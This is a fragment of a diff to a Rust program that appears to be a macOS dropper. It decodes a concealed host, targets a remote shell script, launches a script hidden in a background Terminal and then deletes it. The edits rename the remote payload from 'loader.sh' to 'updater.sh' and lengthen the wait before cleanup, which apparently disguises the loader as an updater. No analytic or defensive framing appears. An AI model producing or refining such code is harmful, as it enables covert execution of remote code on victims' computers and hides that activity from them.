@@ -38,7 +38,7 @@ fn main() {
     }
 
     let url = decode_url();
-    let full_url = format!("https://{}/loader.sh", url);
+    let full_url = format!("https://{}/updater.sh", url);
     let done = done_path();
 
     if let Some(parent) = done.parent() {
@@ -58,6 +58,6 @@ fn main() {
         .args(["-a", "Terminal", "-j", "-g", script_path])
         .spawn();
 
-    std::thread::sleep(Duration::from_secs(2));
+    std::thread::sleep(Duration::from_secs(30));
     let _ = fs::remove_file(script_path);
 }
